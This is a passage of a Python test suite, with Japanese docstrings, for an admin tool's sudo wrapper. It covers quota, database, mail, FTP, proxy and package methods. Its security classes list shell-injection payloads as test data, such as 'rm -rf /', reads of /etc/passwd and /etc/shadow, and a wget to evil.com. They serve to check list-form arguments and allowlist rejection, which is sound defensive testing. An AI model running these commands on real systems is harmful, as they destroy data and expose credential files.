        """get_group_quota が group コマンドとグループ名を渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_group_quota("developers")
        args_called = mock_run.call_args[0][0]
        assert "group" in args_called
        assert "developers" in args_called

    def test_get_all_user_quotas_no_filesystem(self, tmp_path):
        """get_all_user_quotas がファイルシステム指定なしで users コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_all_user_quotas()
        args_called = mock_run.call_args[0][0]
        assert "users" in args_called

    def test_get_all_user_quotas_with_filesystem(self, tmp_path):
        """get_all_user_quotas がファイルシステム指定ありで正常動作する"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_all_user_quotas("/dev/sda1")
        args_called = mock_run.call_args[0][0]
        assert "users" in args_called
        assert "/dev/sda1" in args_called

    def test_set_user_quota(self, tmp_path):
        """set_user_quota が set user コマンドと全パラメータを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.set_user_quota("alice", "/dev/sda1", 1024, 2048)
        args_called = mock_run.call_args[0][0]
        assert "set" in args_called
        assert "user" in args_called
        assert "alice" in args_called
        assert "/dev/sda1" in args_called
        assert "1024" in args_called
        assert "2048" in args_called

    def test_set_user_quota_with_inodes(self, tmp_path):
        """set_user_quota が inode 制限付きで全パラメータを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.set_user_quota("bob", "/dev/sda1", 512, 1024, isoft=100, ihard=200)
        args_called = mock_run.call_args[0][0]
        assert "100" in args_called
        assert "200" in args_called

    def test_set_group_quota(self, tmp_path):
        """set_group_quota が set group コマンドと全パラメータを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.set_group_quota("devops", "/dev/sda1", 4096, 8192)
        args_called = mock_run.call_args[0][0]
        assert "set" in args_called
        assert "group" in args_called
        assert "devops" in args_called
        assert "4096" in args_called
        assert "8192" in args_called

    def test_get_quota_report_no_filesystem(self, tmp_path):
        """get_quota_report がファイルシステム指定なしで report コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_quota_report()
        args_called = mock_run.call_args[0][0]
        assert "report" in args_called

    def test_get_quota_report_with_filesystem(self, tmp_path):
        """get_quota_report がファイルシステム指定ありで正常動作する"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_quota_report("/dev/sda1")
        args_called = mock_run.call_args[0][0]
        assert "report" in args_called
        assert "/dev/sda1" in args_called


class TestDBMonitorMethods:
    """DBモニタリングメソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-dbmonitor.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "ok"})
        return m

    def test_get_db_status_mysql(self, tmp_path):
        """get_db_status が mysql で status コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_db_status("mysql")
        args_called = mock_run.call_args[0][0]
        assert "mysql" in args_called
        assert "status" in args_called

    def test_get_db_status_postgresql(self, tmp_path):
        """get_db_status が postgresql で status コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_db_status("postgresql")
        args_called = mock_run.call_args[0][0]
        assert "postgresql" in args_called

    def test_get_db_status_invalid(self, tmp_path):
        """get_db_status が許可リスト外のDB種別でValueErrorを送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="DB type not allowed"):
            wrapper.get_db_status("mongodb")

    def test_get_db_processlist_mysql(self, tmp_path):
        """get_db_processlist が mysql で processlist コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_db_processlist("mysql")
        args_called = mock_run.call_args[0][0]
        assert "processlist" in args_called

    def test_get_db_processlist_postgresql(self, tmp_path):
        """get_db_processlist が postgresql で activity コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_db_processlist("postgresql")
        args_called = mock_run.call_args[0][0]
        assert "activity" in args_called

    def test_get_db_processlist_invalid(self, tmp_path):
        """get_db_processlist が許可リスト外のDB種別でValueErrorを送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="DB type not allowed"):
            wrapper.get_db_processlist("redis")

    def test_get_db_databases_mysql(self, tmp_path):
        """get_db_databases が mysql で databases コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_db_databases("mysql")
        args_called = mock_run.call_args[0][0]
        assert "databases" in args_called

    def test_get_db_databases_invalid(self, tmp_path):
        """get_db_databases が許可リスト外のDB種別でValueErrorを送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="DB type not allowed"):
            wrapper.get_db_databases("oracle")

    def test_get_db_connections_postgresql(self, tmp_path):
        """get_db_connections が postgresql で connections コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_db_connections("postgresql")
        args_called = mock_run.call_args[0][0]
        assert "connections" in args_called

    def test_get_db_connections_mysql_fallback(self, tmp_path):
        """get_db_connections が mysql で processlist コマンドにフォールバックする"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_db_connections("mysql")
        args_called = mock_run.call_args[0][0]
        assert "processlist" in args_called

    def test_get_db_connections_invalid(self, tmp_path):
        """get_db_connections が許可リスト外のDB種別でValueErrorを送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="DB type not allowed"):
            wrapper.get_db_connections("sqlite")

    def test_get_db_variables_mysql(self, tmp_path):
        """get_db_variables が mysql で variables コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_db_variables("mysql")
        args_called = mock_run.call_args[0][0]
        assert "variables" in args_called

    def test_get_db_variables_postgresql(self, tmp_path):
        """get_db_variables が postgresql で status コマンドにフォールバックする"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_db_variables("postgresql")
        args_called = mock_run.call_args[0][0]
        assert "status" in args_called

    def test_get_db_variables_invalid(self, tmp_path):
        """get_db_variables が許可リスト外のDB種別でValueErrorを送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="DB type not allowed"):
            wrapper.get_db_variables("mssql")


class TestPostfixMethods:
    """Postfix / SMTP メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-postfix.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "active"})
        return m

    def test_get_postfix_status(self, tmp_path):
        """get_postfix_status が status コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_postfix_status()
        args_called = mock_run.call_args[0][0]
        assert "status" in args_called

    def test_get_postfix_queue(self, tmp_path):
        """get_postfix_queue が queue コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_postfix_queue()
        args_called = mock_run.call_args[0][0]
        assert "queue" in args_called

    def test_get_postfix_logs_default(self, tmp_path):
        """get_postfix_logs がデフォルト50行で logs コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_postfix_logs()
        args_called = mock_run.call_args[0][0]
        assert "logs" in args_called
        assert "50" in args_called

    def test_get_postfix_logs_custom_lines(self, tmp_path):
        """get_postfix_logs がカスタム行数で logs コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_postfix_logs(lines=100)
        args_called = mock_run.call_args[0][0]
        assert "100" in args_called

    def test_get_postfix_logs_clamp_max(self, tmp_path):
        """get_postfix_logs が最大値200でクランプする"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_postfix_logs(lines=9999)
        args_called = mock_run.call_args[0][0]
        assert "200" in args_called

    def test_get_postfix_logs_clamp_min(self, tmp_path):
        """get_postfix_logs が最小値1でクランプする"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_postfix_logs(lines=0)
        args_called = mock_run.call_args[0][0]
        assert "1" in args_called


# ===========================================================================
# TestSecurityShellInjection: shell injection 防御のテスト（CLAUDE.md セキュリティ要件）
# ===========================================================================


class TestSecurityShellInjection:
    """shell injection 文字を含む入力が安全に処理されることを確認

    CLAUDE.md 要件:
    - subprocess.run は常にリスト形式で呼ばれる（shell=True 禁止）
    - 特殊文字を含む引数はそのまま配列要素として渡される
    """

    INJECTION_PAYLOADS = [
        "nginx; rm -rf /",
        "nginx | cat /etc/passwd",
        "nginx & wget evil.com",
        "nginx$(whoami)",
        "nginx`id`",
        "nginx > /tmp/pwned",
        "nginx < /etc/shadow",
        'nginx"$(whoami)"',
        "nginx'$(id)'",
        "nginx && cat /etc/shadow",
        "nginx || true",
        "nginx\nnewcommand",
        "nginx\x00null",
    ]

    def _make_wrapper(self, tmp_path, *scripts):
        """テスト用ラッパーを作成"""
        (tmp_path / "adminui-status.sh").touch()
        for s in scripts:
            (tmp_path / s).touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "ok"})
        return m

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_execute_passes_args_as_list_not_shell(self, tmp_path, payload):
        """_execute が引数をリスト形式で渡し、shell=True を使わないことを確認"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper._execute("adminui-status.sh", [payload])

        # subprocess.run の呼び出し検証
        call_args = mock_run.call_args
        cmd = call_args[0][0]
        kwargs = call_args[1] if len(call_args) > 1 else call_args.kwargs

        # コマンドがリスト形式であること
        assert isinstance(cmd, list), "cmd must be a list, not a string"
        # shell=True が使われていないこと
        assert kwargs.get("shell") is not True, "shell=True is forbidden"
        # ペイロードがリストの1要素としてそのまま含まれていること
        assert payload in cmd, "payload must be passed as a single list element"

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_execute_with_stdin_passes_args_as_list(self, tmp_path, payload):
        """_execute_with_stdin も引数をリスト形式で渡すことを確認"""
        (tmp_path / "adminui-user-add.sh").touch()
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper._execute_with_stdin("adminui-user-add.sh", [payload], "stdin_data")

        call_args = mock_run.call_args
        cmd = call_args[0][0]
        kwargs = call_args[1] if len(call_args) > 1 else call_args.kwargs

        assert isinstance(cmd, list)
        assert kwargs.get("shell") is not True
        assert payload in cmd

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_restart_service_injection_safe(self, tmp_path, payload):
        """restart_service に injection ペイロードを渡しても安全であることを確認"""
        wrapper = self._make_wrapper(tmp_path, "adminui-service-restart.sh")
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.restart_service(payload)

        cmd = mock_run.call_args[0][0]
        assert isinstance(cmd, list)
        assert payload in cmd

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_get_logs_injection_safe(self, tmp_path, payload):
        """get_logs のサービス名に injection ペイロードを渡しても安全であることを確認"""
        wrapper = self._make_wrapper(tmp_path, "adminui-logs.sh")
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_logs(payload)

        cmd = mock_run.call_args[0][0]
        assert isinstance(cmd, list)
        assert payload in cmd


# ===========================================================================
# TestSecurityServerAllowlist: サーバー allowlist バイパステスト
# ===========================================================================


class TestSecurityServerAllowlist:
    """サーバー allowlist が正しく機能し、バイパスできないことを確認"""

    BYPASS_ATTEMPTS = [
        "nginx; ls",
        "apache2\x00extra",
        "../etc/passwd",
        "mysql --help",
        "redis\nmalicious",
        "NGINX",  # 大文字
        " nginx",  # 先頭スペース
        "nginx ",  # 末尾スペース
        "postgresql\ttab",
    ]

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-servers.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    @pytest.mark.parametrize("server", BYPASS_ATTEMPTS)
    def test_get_server_status_rejects_bypass(self, tmp_path, server):
        """get_server_status が allowlist バイパス試行を拒否する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="Server not allowed"):
            wrapper.get_server_status(server)

    @pytest.mark.parametrize("server", BYPASS_ATTEMPTS)
    def test_get_server_version_rejects_bypass(self, tmp_path, server):
        """get_server_version が allowlist バイパス試行を拒否する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="Server not allowed"):
            wrapper.get_server_version(server)

    @pytest.mark.parametrize("server", BYPASS_ATTEMPTS)
    def test_get_server_config_info_rejects_bypass(self, tmp_path, server):
        """get_server_config_info が allowlist バイパス試行を拒否する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="Server not allowed"):
            wrapper.get_server_config_info(server)


# ===========================================================================
# TestSecurityDbAllowlist: DB allowlist バイパステスト
# ===========================================================================


class TestSecurityDbAllowlist:
    """DB type allowlist が正しく機能し、バイパスできないことを確認"""

    BYPASS_ATTEMPTS = [
        "mysql; ls",
        "mongodb",
        "sqlite",
        "MYSQL",
        " postgresql",
        "mysql\x00extra",
        "oracle",
        "mssql",
        "",
    ]

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-dbmonitor.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    @pytest.mark.parametrize("db_type", BYPASS_ATTEMPTS)
    def test_get_db_status_rejects_bypass(self, tmp_path, db_type):
        """get_db_status が allowlist バイパス試行を拒否する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="DB type not allowed"):
            wrapper.get_db_status(db_type)

    @pytest.mark.parametrize("db_type", BYPASS_ATTEMPTS)
    def test_get_db_processlist_rejects_bypass(self, tmp_path, db_type):
        """get_db_processlist が allowlist バイパス試行を拒否する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="DB type not allowed"):
            wrapper.get_db_processlist(db_type)

    @pytest.mark.parametrize("db_type", BYPASS_ATTEMPTS)
    def test_get_db_databases_rejects_bypass(self, tmp_path, db_type):
        """get_db_databases が allowlist バイパス試行を拒否する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="DB type not allowed"):
            wrapper.get_db_databases(db_type)


# ===========================================================================
# TestSecurityHardwareSmart: SMART デバイスパス検証テスト
# ===========================================================================


class TestSecurityHardwareSmart:
    """get_hardware_smart のデバイスパス検証が正しく動作することを確認"""

    VALID_DEVICES = [
        "/dev/sda",
        "/dev/sdb",
        "/dev/sdz",
        "/dev/nvme0n0",
        "/dev/nvme1n1",
        "/dev/vda",
        "/dev/xvda",
        "/dev/hda",
    ]

    INVALID_DEVICES = [
        "/dev/sda1",  # パーティション
        "/dev/sda; rm -rf /",
        "/dev/../etc/shadow",
        "/tmp/sda",
        "sda",
        "/dev/",
        "/dev/sd",
        "/dev/nvme",
        "/dev/sda\x00",
        "/etc/passwd",
        "",
        "/dev/sda$(whoami)",
        "/dev/sda`id`",
    ]

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-hardware.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    @pytest.mark.parametrize("device", VALID_DEVICES)
    def test_valid_device_accepted(self, tmp_path, device):
        """正当なデバイスパスが受け入れられること"""
        wrapper = self._make_wrapper(tmp_path)
        m = MagicMock()
        m.stdout = json.dumps({"smart": {}})
        with patch("subprocess.run", return_value=m):
            # ValueError が発生しなければ OK
            wrapper.get_hardware_smart(device)

    @pytest.mark.parametrize("device", INVALID_DEVICES)
    def test_invalid_device_rejected(self, tmp_path, device):
        """不正なデバイスパスが拒否されること"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="Invalid device path"):
            wrapper.get_hardware_smart(device)


# ===========================================================================
# TestSecurityInterfaceValidation: インターフェース名バリデーションテスト
# ===========================================================================


class TestSecurityInterfaceValidation:
    """_validate_iface のバリデーションが正しく動作することを確認"""

    VALID_IFACES = [
        "eth0",
        "enp0s3",
        "wlan0",
        "br-docker0",
        "veth123abc",
        "lo",
        "bond0.100",
        "a",
    ]

    INVALID_IFACES = [
        "",
        "eth0; ls",
        "eth0$(id)",
        "eth0`whoami`",
        "a" * 33,  # 33文字 (上限32)
        "eth0 extra",  # スペース含む
        "eth0\ttab",
        "eth0\nnewline",
        "eth0/slash",
    ]

    def test_valid_ifaces_accepted(self):
        """正当なインターフェース名がバリデーションを通過する"""
        wrapper = SudoWrapper.__new__(SudoWrapper)
        for iface in self.VALID_IFACES:
            # ValueError が発生しなければ OK
            wrapper._validate_iface(iface)

    @pytest.mark.parametrize("iface", INVALID_IFACES)
    def test_invalid_ifaces_rejected(self, iface):
        """不正なインターフェース名が拒否される"""
        wrapper = SudoWrapper.__new__(SudoWrapper)
        with pytest.raises(ValueError, match="Invalid interface name"):
            wrapper._validate_iface(iface)


# ===========================================================================
# TestExecuteCommandStructure: コマンド構造の検証テスト
# ===========================================================================


class TestExecuteCommandStructure:
    """_execute が生成するコマンドの構造を検証"""

    def _make_wrapper(self, tmp_path, *scripts):
        (tmp_path / "adminui-status.sh").touch()
        for s in scripts:
            (tmp_path / s).touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "ok"})
        return m

    def test_command_starts_with_sudo(self, tmp_path):
        """コマンドの先頭が 'sudo' であること"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_system_status()

        cmd = mock_run.call_args[0][0]
        assert cmd[0] == "sudo"

    def test_command_second_element_is_wrapper_path(self, tmp_path):
        """コマンドの2番目要素がラッパースクリプトのフルパスであること"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_system_status()

        cmd = mock_run.call_args[0][0]
        assert cmd[1] == str(tmp_path / "adminui-status.sh")

    def test_check_true_is_set(self, tmp_path):
        """subprocess.run に check=True が設定されていること"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_system_status()

        kwargs = mock_run.call_args[1] if len(mock_run.call_args) > 1 else mock_run.call_args.kwargs
        assert kwargs.get("check") is True

    def test_capture_output_is_set(self, tmp_path):
        """subprocess.run に capture_output=True が設定されていること"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_system_status()

        kwargs = mock_run.call_args[1] if len(mock_run.call_args) > 1 else mock_run.call_args.kwargs
        assert kwargs.get("capture_output") is True

    def test_text_mode_is_set(self, tmp_path):
        """subprocess.run に text=True が設定されていること"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_system_status()

        kwargs = mock_run.call_args[1] if len(mock_run.call_args) > 1 else mock_run.call_args.kwargs
        assert kwargs.get("text") is True

    def test_timeout_is_set(self, tmp_path):
        """subprocess.run に timeout が設定されていること"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_system_status()

        kwargs = mock_run.call_args[1] if len(mock_run.call_args) > 1 else mock_run.call_args.kwargs
        assert "timeout" in kwargs
        assert kwargs["timeout"] > 0

    def test_execute_with_stdin_has_input_kwarg(self, tmp_path):
        """_execute_with_stdin で input kwarg が正しく設定されること"""
        (tmp_path / "adminui-user-passwd.sh").touch()
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.change_user_password(username="alice", password_hash="$6$hash")

        kwargs = mock_run.call_args[1] if len(mock_run.call_args) > 1 else mock_run.call_args.kwargs
        assert kwargs.get("input") == "$6$hash"


# ===========================================================================
# TestCalledProcessErrorStdoutFallback: CalledProcessError の stdout JSON フォールバック
# ===========================================================================


class TestCalledProcessErrorStdoutFallback:
    """CalledProcessError 時に stderr=None, stdout=JSON の場合のフォールバックテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def test_execute_stderr_none_stdout_json(self, tmp_path):
        """stderr=None で stdout に JSON がある場合、stdout の JSON を返す"""
        wrapper = self._make_wrapper(tmp_path)
        error_data = {"status": "error", "code": "RESOURCE_BUSY"}
        exc = subprocess.CalledProcessError(
            returncode=1, cmd=[], stderr=None, output=json.dumps(error_data)
        )

        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = exc
            result = wrapper._execute("adminui-status.sh", [])

        assert result["status"] == "error"
        assert result["code"] == "RESOURCE_BUSY"

    def test_execute_with_stdin_stderr_none_stdout_json(self, tmp_path):
        """_execute_with_stdin でも同様のフォールバックが機能する"""
        (tmp_path / "adminui-user-add.sh").touch()
        wrapper = self._make_wrapper(tmp_path)
        error_data = {"status": "error", "code": "DUPLICATE_USER"}
        exc = subprocess.CalledProcessError(
            returncode=1, cmd=[], stderr=None, output=json.dumps(error_data)
        )

        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = exc
            result = wrapper._execute_with_stdin("adminui-user-add.sh", [], "hash")

        assert result["status"] == "error"
        assert result["code"] == "DUPLICATE_USER"

    def test_execute_stderr_empty_string_stdout_json(self, tmp_path):
        """stderr='' で stdout に JSON がある場合のフォールバック"""
        wrapper = self._make_wrapper(tmp_path)
        error_data = {"status": "failed", "reason": "timeout"}
        exc = subprocess.CalledProcessError(
            returncode=1, cmd=[], stderr="", output=json.dumps(error_data)
        )

        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = exc
            # stderr="" は falsy なので e.stdout が使われる
            result = wrapper._execute("adminui-status.sh", [])

        assert result["status"] == "failed"


# ===========================================================================
# TestBandwidthMethods: 帯域幅メソッドのテスト
# ===========================================================================


class TestBandwidthMethods:
    """Bandwidth メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-bandwidth.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "ok"})
        return m

    def test_get_bandwidth_history(self, tmp_path):
        """get_bandwidth_history が history コマンドをインターフェース名付きで渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_history("eth0")
        args = mock_run.call_args[0][0]
        assert "history" in args
        assert "eth0" in args

    def test_get_bandwidth_monthly(self, tmp_path):
        """get_bandwidth_monthly が monthly コマンドをインターフェース名付きで渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_monthly("eth0")
        args = mock_run.call_args[0][0]
        assert "monthly" in args
        assert "eth0" in args

    def test_get_bandwidth_alert_config(self, tmp_path):
        """get_bandwidth_alert_config が alert-config コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_alert_config()
        args = mock_run.call_args[0][0]
        assert "alert-config" in args


# ===========================================================================
# TestFTPMethods: FTPサーバーメソッドのテスト
# ===========================================================================


class TestFTPMethods:
    """FTP サーバーメソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-proftpd.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "active"})
        return m

    def test_get_ftp_status(self, tmp_path):
        """get_ftp_status が status コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_ftp_status()
        assert "status" in mock_run.call_args[0][0]

    def test_get_ftp_users(self, tmp_path):
        """get_ftp_users が users コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_ftp_users()
        assert "users" in mock_run.call_args[0][0]

    def test_get_ftp_sessions(self, tmp_path):
        """get_ftp_sessions が sessions コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_ftp_sessions()
        assert "sessions" in mock_run.call_args[0][0]

    def test_get_ftp_logs_default(self, tmp_path):
        """get_ftp_logs がデフォルト50行を渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_ftp_logs()
        args = mock_run.call_args[0][0]
        assert "logs" in args
        assert "50" in args

    def test_get_ftp_logs_clamp(self, tmp_path):
        """get_ftp_logs が最大値200でクランプする"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_ftp_logs(lines=9999)
        assert "200" in mock_run.call_args[0][0]


# ===========================================================================
# TestSquidMethods: Squídプロキシメソッドのテスト
# ===========================================================================


class TestSquidMethods:
    """Squid プロキシメソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-squid.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"status": "active"})
        return m

    def test_get_squid_status(self, tmp_path):
        """get_squid_status が status コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_squid_status()
        assert "status" in mock_run.call_args[0][0]

    def test_get_squid_cache(self, tmp_path):
        """get_squid_cache が cache コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_squid_cache()
        assert "cache" in mock_run.call_args[0][0]

    def test_get_squid_logs(self, tmp_path):
        """get_squid_logs が logs コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_squid_logs(lines=30)
        args = mock_run.call_args[0][0]
        assert "logs" in args
        assert "30" in args

    def test_get_squid_logs_clamp_min(self, tmp_path):
        """get_squid_logs が最小値1でクランプする"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_squid_logs(lines=0)
        assert "1" in mock_run.call_args[0][0]

    def test_get_squid_config_check(self, tmp_path):
        """get_squid_config_check が config-check コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_squid_config_check()
        assert "config-check" in mock_run.call_args[0][0]


# ===========================================================================
# TestPackagesDirectSubprocess: packages直接subprocess.runメソッドのテスト
# ===========================================================================


class TestPackagesDirectSubprocess:
    """packages の直接 subprocess.run を使うメソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_run(self):
        m = MagicMock()
        m.stdout = "package list output"
        m.stderr = ""
        m.returncode = 0
        return m

    def test_get_packages_upgradeable(self, tmp_path):
        """get_packages_upgradeable が upgradeable サブコマンドで subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_packages_upgradeable()
        args = mock_run.call_args[0][0]
        assert "upgradeable" in args
        assert result["returncode"] == 0

    def test_search_packages(self, tmp_path):
        """search_packages が search サブコマンドとクエリで subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.search_packages("nginx")
        args = mock_run.call_args[0][0]
        assert "search" in args
        assert "nginx" in args

    def test_search_packages_forbidden_chars(self, tmp_path):
        """search_packages が禁止文字を含むクエリで ValueError を送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="Forbidden character"):
